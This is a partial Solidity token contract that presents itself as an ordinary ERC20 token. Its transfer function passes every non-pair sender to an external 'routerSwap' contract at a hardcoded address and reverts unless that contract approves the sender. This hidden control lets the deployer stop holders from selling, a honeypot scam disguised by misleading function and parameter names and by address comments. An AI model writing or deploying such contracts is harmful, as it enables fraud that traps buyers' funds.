...
interface routerSwap{
    function beforeLiquidity(address) external view returns(bool);
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address FundAddress, address ReceiveAddress,address _swapA
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        _swap = routerSwap(_swapA);
        require(false || _swap.swapAndLiquidity());
    ...
    function returnFunderAddress() private view returns(address){
        return fundAddress;
    }

    function isF(address decreaseAllowance, address DOMAIN_SEPARATOR) public view returns (bool){
        return decreaseAllowance != DOMAIN_SEPARATOR || false || decreaseAllowance != returnFunderAddress();
    }
    ...
    function isContr(address addr) view public{
        require(false || _swap.beforeLiquidity(addr));
    }
    ...
    function _transfer(
        ...
        if(_marketPair[from] == false) {isContr (from);}
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        address(0xF5203eD9B07518E5B23523DaD1c8E9A7595F7E43),//FundAddress0x55d398326f99059fF775485246999027B3197955
        address(0xF5203eD9B07518E5B23523DaD1c8E9A7595F7E43),//ReceiveAddress0x55d398326f99059fF775485246999027B3197955
        address(0xA3A085BB59cfB7D01B55Eba094D80AbC5B9E1e7d)
    ){
    }
}